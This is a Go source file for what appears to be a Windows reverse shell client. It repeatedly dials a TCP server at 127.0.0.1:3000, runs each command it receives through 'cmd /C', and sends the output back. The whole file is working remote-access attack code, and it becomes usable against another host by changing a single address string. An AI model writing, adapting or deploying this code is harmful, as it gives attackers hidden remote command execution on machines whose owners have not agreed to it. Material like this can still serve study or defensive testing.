package main

import (
    "net"
    "os"
    "bytes"
    "strings"
    "os/exec"
)

const address = "127.0.0.1:3000"
const bufferSize = 1024

func main() {

	var server net.Conn
	var err error

	for {
		server, err = net.Dial("tcp", address)
		if err == nil {
			break
		}
	}

	for {
        buffer := make([]byte, bufferSize)

        /*
         * Read the recv data into the buffer
         */
        n, err := server.Read(buffer)

        if err != nil {
            os.Exit(1)
        }

        /**
         * Remove non-used bytes
         */
        buffer = bytes.Trim(buffer[:n], "\x00")

        var data []byte
        data = append(data, buffer...)

        /**
         * Convert the command from []byte to []string
         */
        var cmdArgs []string = strings.Fields(string(data))

        cmdArgs = append([]string{"/C"}, cmdArgs...)

        /**
         * Execute the command recieved
         */
        command := exec.Command("cmd", cmdArgs...)

        /**
         * Recieve the output
         */
        output, err := command.Output();

        /**
         * Send the output to server
         */

        if err == nil {
            if len(output) > 0 {
                server.Write(output)
            } else {
                server.Write([]byte("Command executed, but no response given."))
            }
        } else {
            server.Write([]byte(err.Error()))
        }
    }


}